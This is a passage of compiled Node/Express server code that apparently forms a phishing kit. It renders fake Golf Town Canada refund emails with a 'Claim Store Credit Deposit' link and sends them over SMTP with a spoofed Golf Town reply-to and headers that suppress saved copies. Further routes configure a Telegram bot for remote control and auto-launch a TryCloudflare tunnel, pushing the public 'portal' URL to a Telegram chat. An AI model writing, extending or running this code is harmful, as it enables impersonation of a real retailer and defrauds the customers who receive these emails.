                  <!-- TRANSACTION STATEMENT SUMMARY -->
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="background-color: #f9fafb; border: 1px solid #e5e7eb; border-radius: 6px; margin-bottom: 28px;">
                    <tr>
                      <td style="padding: 20px;">
                        <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0" style="font-size: 13px; color: #374151;">
                          <tr>
                            <td style="padding-bottom: 8px; color: #6b7280; font-weight: 600;">Refund Amount:</td>
                            <td align="right" style="padding-bottom: 8px; font-size: 20px; font-weight: 800; color: #004d25;">
                              $${amount} CAD
                            </td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Customer Account ID:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-family: monospace; font-weight: 700; color: #111827;">${custId || "GT-CUSTOMER"}</td>
                          </tr>
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Store Location:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; font-weight: 600; color: #111827;">Store #${storeId || "504"}</td>
                          </tr>
                          ${comments ? `
                          <tr>
                            <td style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #6b7280;">Reference Notes:</td>
                            <td align="right" style="padding: 6px 0; border-top: 1px solid #f3f4f6; color: #374151;">${comments}</td>
                          </tr>` : ""}
                        </table>
                      </td>
                    </tr>
                  </table>

                  <!-- SECURE OFFICIAL DEPOSIT ACTION CALLOUT -->
                  <div style="text-align: center; background-color: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 6px; padding: 24px; margin-bottom: 28px;">
                    <div style="font-size: 12px; font-weight: 700; color: #166534; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px;">
                      Verified Secure Refund Link
                    </div>
                    
                    <div style="margin-bottom: 16px;">
                      <a href="${secureDepositUrl}" target="_blank" style="display: inline-block; background-color: #004d25; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 700; padding: 14px 28px; border-radius: 4px; border: 1px solid #003318;">
                        Claim Store Credit Deposit ($${amount} CAD)
                      </a>
                    </div>

                    <div style="font-size: 11px; color: #9ca3af; font-family: monospace; margin-top: 4px;">
                      Token ID: ${depositToken}
                    </div>
                  </div>

                  <p style="font-size: 12px; color: #6b7280; line-height: 1.5; margin: 0 0 20px 0;">
                    Please note: This secure link is valid for 72 hours. For security purposes, do not share this link or reference token with unauthorized parties.
                  </p>
                </td>
              </tr>

              <!-- COMMERCIAL FOOTER -->
              <tr>
                <td style="background-color: #f9fafb; padding: 20px 32px; border-top: 1px solid #e5e7eb; font-family: Arial, Helvetica, sans-serif; font-size: 11px; color: #6b7280; line-height: 1.5;">
                  <table role="presentation" width="100%" cellspacing="0" cellpadding="0" border="0">
                    <tr>
                      <td style="padding-bottom: 10px;">
                        <strong>Golf Town Customer Support &amp; eGift Services</strong><br>
                        Powered by CashStar / Blackhawk Network Services
                      </td>
                    </tr>
                    <tr>
                      <td style="border-top: 1px solid #e5e7eb; padding-top: 10px; color: #9ca3af;">
                        &copy; ${(/* @__PURE__ */ new Date()).getFullYear()} Golf Town Canada Inc. All rights reserved. Golf Town and the Golf Town logo are registered trademarks.
                      </td>
                    </tr>
                    <tr>
                      <td style="padding-top: 8px; font-size: 10px; color: #a1a1aa; line-height: 1.4;">
                        Need assistance? Contact Golf Town Customer Care at <a href="mailto:support@payment.golftown.ca" style="color: #004d25; text-decoration: none; font-weight: bold;">support@payment.golftown.ca</a> or Toll-Free 1-844-360-1010.
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>

            </table>
          </td>
        </tr>
      </table>
    </body>
    </html>
  `;
  pushNoticeHistory({
    recipientEmail,
    recipientName: recipientName || "Valued Customer",
    amount: amount || "250.00",
    storeId: storeId || "504",
    custId: custId || "GT-CUSTOMER",
    subject: emailSubject,
    actionType: actionType || "refund_notice",
    depositToken,
    secureDepositUrl,
    status: "DELIVERED"
  });
  const sessionLogs = [];
  const customLogger = {
    level: () => "debug",
    info: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[INFO] ${msg}`);
    },
    warn: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[WARN] ${msg}`);
    },
    error: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[ERROR] ${msg}`);
    },
    debug: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[DEBUG] ${msg}`);
    },
    trace: (entry) => {
      const msg = typeof entry === "object" ? entry.msg || JSON.stringify(entry) : String(entry);
      sessionLogs.push(`[TRACE] ${msg}`);
    }
  };
  try {
    const nodemailer = await import("nodemailer");
    const transporter = nodemailer.createTransport({
      host,
      port,
      secure: port === 465,
      auth: { user, pass },
      connectionTimeout: 1e4,
      greetingTimeout: 1e4,
      tls: {
        rejectUnauthorized: customSmtpConfig?.tlsRejectUnauthorized !== false
      },
      debug: true,
      logger: customLogger
    });
    sessionLogs.push("[SYSTEM] Establishing outbound connection to server...");
    await transporter.sendMail({
      from,
      replyTo: "GOLFTOWN SUPPORT <support@payment.golftown.ca>",
      to: recipientEmail,
      subject: emailSubject,
      html: emailHtml,
      headers: {
        "X-No-Save-Sent": "true",
        "X-Auto-Response-Suppress": "All",
        "X-Outbox-Bypass": "enabled",
        "X-Mailer": "GolfTown-Internal-CreditSystem/1.0"
      }
    });
    sessionLogs.push(`[SYSTEM] Dispatch completed. Refund notice successfully accepted by remote MTA for delivery to <${recipientEmail}>.`);
    const debugLogEntry = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
      timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      type: "refund_notice",
      recipient: recipientEmail,
      host,
      port,
      success: true,
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();
    res.json({
      success: true,
      simulated: false,
      outboxSaved: false,
      message: `Official store credit refund notice sent via background SMTP to ${recipientEmail}.`,
      debugLogs: sessionLogs
    });
  } catch (error) {
    console.warn("SMTP Direct connection attempt failed:", error?.message || error);
    sessionLogs.push(`[SYSTEM ERROR] SMTP transmission failed: ${error?.message || error}`);
    const debugLogEntry = {
      id: `LOG-${Date.now()}-${Math.floor(Math.random() * 1e3)}`,
      timestamp: (/* @__PURE__ */ new Date()).toLocaleTimeString() + " " + (/* @__PURE__ */ new Date()).toLocaleDateString(),
      type: "refund_notice",
      recipient: recipientEmail,
      host,
      port,
      success: false,
      error: error?.message || "SMTP Connection failed.",
      logs: sessionLogs
    };
    smtpDebugLogsStack.unshift(debugLogEntry);
    if (smtpDebugLogsStack.length > 20) smtpDebugLogsStack.pop();
    res.status(500).json({
      success: false,
      error: error?.message || "SMTP Connection failed.",
      message: `Error sending via Nodemailer: ${error?.message || "unknown error"}. Notice was NOT sent.`,
      debugLogs: sessionLogs
    });
  }
});
app.get("/api/telegram-config", (req, res) => {
  res.json({
    telegramToken: customTelegramConfig.telegramToken,
    telegramChatId: customTelegramConfig.telegramChatId,
    isPollingActive: isPollingLoopRunning
  });
});
app.post("/api/telegram-config", async (req, res) => {
  const { telegramToken, telegramChatId } = req.body;
  const tokenChanged = telegramToken !== void 0 && telegramToken !== customTelegramConfig.telegramToken;
  if (telegramToken !== void 0) {
    customTelegramConfig.telegramToken = telegramToken;
  }
  if (telegramChatId !== void 0) {
    customTelegramConfig.telegramChatId = telegramChatId;
  }
  saveTelegramConfig(customTelegramConfig);
  if (tokenChanged) {
    await stopTelegramPolling();
    if (customTelegramConfig.telegramToken) {
      await startTelegramPolling();
    }
  }
  res.json({
    success: true,
    message: "Telegram integration configuration updated.",
    config: {
      telegramToken: customTelegramConfig.telegramToken,
      telegramChatId: customTelegramConfig.telegramChatId,
      isPollingActive: isPollingLoopRunning
    }
  });
});
app.post("/api/telegram-config/test", async (req, res) => {
  if (!customTelegramConfig.telegramToken) {
    return res.status(400).json({ success: false, error: "No Telegram bot token is configured." });
  }
  if (!customTelegramConfig.telegramChatId) {
    return res.status(400).json({ success: false, error: "No target Chat ID is configured. Please bind the bot in your group by typing /start first." });
  }
  const result = await sendTelegramRequest("sendMessage", {
    chat_id: customTelegramConfig.telegramChatId,
    text: `\u{1F514} *GOLF TOWN INTEGRATION TEST NOTICE* \u{1F514}

This is an authorized SMTP/HTTP system confirmation notice. Your interactive Telegram webhook connection is 100% active and running.`,
    parse_mode: "Markdown"
  });
  if (result && result.ok) {
    res.json({ success: true, message: "Test message transmitted successfully to your group!" });
  } else {
    res.status(500).json({ success: false, error: result?.description || "Telegram Bot API error." });
  }
});
app.get("/api/telegram-config/start-polling", async (req, res) => {
  if (!customTelegramConfig.telegramToken) {
    return res.status(400).json({ success: false, error: "Cannot start polling without a valid bot token." });
  }
  await startTelegramPolling();
  res.json({ success: true, isPollingActive: isPollingLoopRunning });
});
app.get("/api/telegram-config/stop-polling", async (req, res) => {
  await stopTelegramPolling();
  res.json({ success: true, isPollingActive: isPollingLoopRunning });
});
app.post("/api/telegram-config/start-polling", async (req, res) => {
  if (!customTelegramConfig.telegramToken) {
    return res.status(400).json({ success: false, error: "Cannot start polling without a valid bot token." });
  }
  await startTelegramPolling();
  res.json({ success: true, isPollingActive: isPollingLoopRunning });
});
app.post("/api/telegram-config/stop-polling", async (req, res) => {
  await stopTelegramPolling();
  res.json({ success: true, isPollingActive: isPollingLoopRunning });
});
app.get("/api/cloudflare-tunnel", (req, res) => {
  const fileExists = import_fs.default.existsSync(".cloudflare_url");
  let url = "";
  if (fileExists) {
    try {
      url = import_fs.default.readFileSync(".cloudflare_url", "utf8").trim();
    } catch (err) {
      console.error("Failed to read .cloudflare_url:", err);
    }
  }
  res.json({
    success: true,
    active: fileExists,
    url
  });
});
app.post("/api/cloudflare-tunnel", (req, res) => {
  const { url } = req.body;
  if (url) {
    try {
      import_fs.default.writeFileSync(".cloudflare_url", url.trim(), "utf8");
      return res.json({
        success: true,
        active: true,
        url: url.trim(),
        message: "Manual TryCloudflare tunnel URL set successfully."
      });
    } catch (err) {
      return res.status(500).json({
        success: false,
        error: err.message || "Failed to save TryCloudflare URL."
      });
    }
  }
  (0, import_child_process.exec)("bash ./run.sh tunnel-start", (error, stdout, stderr) => {
    if (error) {
      console.error("Failed to start TryCloudflare via run.sh:", error);
      return res.status(500).json({
        success: false,
        error: error.message,
        stderr
      });
    }
    try {
      if (import_fs.default.existsSync(".cloudflare_url")) {
        const tunnelUrl = import_fs.default.readFileSync(".cloudflare_url", "utf8").trim();
        if (customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId) {
          sendTelegramRequest("sendMessage", {
            chat_id: customTelegramConfig.telegramChatId,
            text: `\u26A1 *TRYCLOUDFLARE PUBLIC TUNNEL ACTIVATED* \u26A1

\u2022 *Portal URL:* \`${tunnelUrl}\`
\u2022 *Status:* \`ACTIVE (MANUALLY STARTED)\`

\u{1F449} Tap the link above to securely access the Portal!`,
            parse_mode: "Markdown"
          }).catch((err) => console.error("Failed to notify Telegram of manual tunnel activation:", err));
        }
        return res.json({
          success: true,
          active: true,
          url: tunnelUrl,
          message: "TryCloudflare tunnel started successfully via bash script."
        });
      } else {
        return res.status(500).json({
          success: false,
          error: "Tunnel script ran but .cloudflare_url file was not created."
        });
      }
    } catch (err) {
      return res.status(500).json({
        success: false,
        error: err.message || "Failed to read generated tunnel URL."
      });
    }
  });
});
app.post("/api/cloudflare-tunnel/stop", (req, res) => {
  (0, import_child_process.exec)("./run.sh tunnel-stop", (error, stdout, stderr) => {
    if (error) {
      console.error("Failed to stop TryCloudflare via run.sh:", error);
      return res.status(500).json({
        success: false,
        error: error.message,
        stderr
      });
    }
    return res.json({
      success: true,
      active: false,
      url: "",
      message: "TryCloudflare tunnel stopped successfully via bash script."
    });
  });
});
app.get("/api/health", (req, res) => {
  res.json({ status: "ok" });
});
async function startServer() {
  const publicPath = import_path.default.join(process.cwd(), "public");
  if (import_fs.default.existsSync(publicPath)) {
    app.use(import_express.default.static(publicPath));
  }
  const distPath = import_path.default.join(process.cwd(), "dist");
  const distIndexPath = import_path.default.join(distPath, "index.html");
  if (process.env.NODE_ENV === "production" && import_fs.default.existsSync(distIndexPath)) {
    app.use(import_express.default.static(distPath, {
      maxAge: "1y",
      immutable: true,
      setHeaders: (res, filePath) => {
        if (filePath.includes("/assets/")) {
          res.setHeader("Cache-Control", "public, max-age=31536000, immutable");
        } else {
          res.setHeader("Cache-Control", "public, max-age=3600");
        }
      }
    }));
    app.get("*", (req, res) => {
      res.sendFile(distIndexPath);
    });
  } else {
    const { createServer: createViteServer } = await import("vite");
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa"
    });
    app.use(vite.middlewares);
  }
  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
    console.log("Initiating automatic TryCloudflare tunnel verification...");
    (0, import_child_process.exec)("bash ./run.sh tunnel-start", async (error, stdout, stderr) => {
      if (error) {
        console.error("Failed to auto-start TryCloudflare tunnel on boot:", error);
        return;
      }
      if (import_fs.default.existsSync(".cloudflare_url")) {
        const tunnelUrl = import_fs.default.readFileSync(".cloudflare_url", "utf8").trim();
        console.log(`[Boot Auto-Tunnel] TryCloudflare tunnel is live: ${tunnelUrl}`);
        if (customTelegramConfig.telegramToken && customTelegramConfig.telegramChatId) {
          try {
            const messageText = `\u26A1 *TRYCLOUDFLARE PUBLIC TUNNEL ONLINE* \u26A1

\u2022 *Portal URL:* \`${tunnelUrl}\`
\u2022 *Status:* \`ACTIVE (BOOT AUTO-LAUNCHED)\`
\u2022 *Local Bind:* \`http://localhost:3000\`

\u{1F449} Access the administrative portal securely via this live link!`;
            await sendTelegramRequest("sendMessage", {
              chat_id: customTelegramConfig.telegramChatId,
              text: messageText,
              parse_mode: "Markdown"
            });
            console.log("Successfully notified Telegram of auto-started TryCloudflare tunnel.");
          } catch (telErr) {
            console.error("Failed to notify Telegram of auto-started tunnel:", telErr);
          }
        }
      }
    });
  });
}
startServer();
//# sourceMappingURL=server.cjs.map
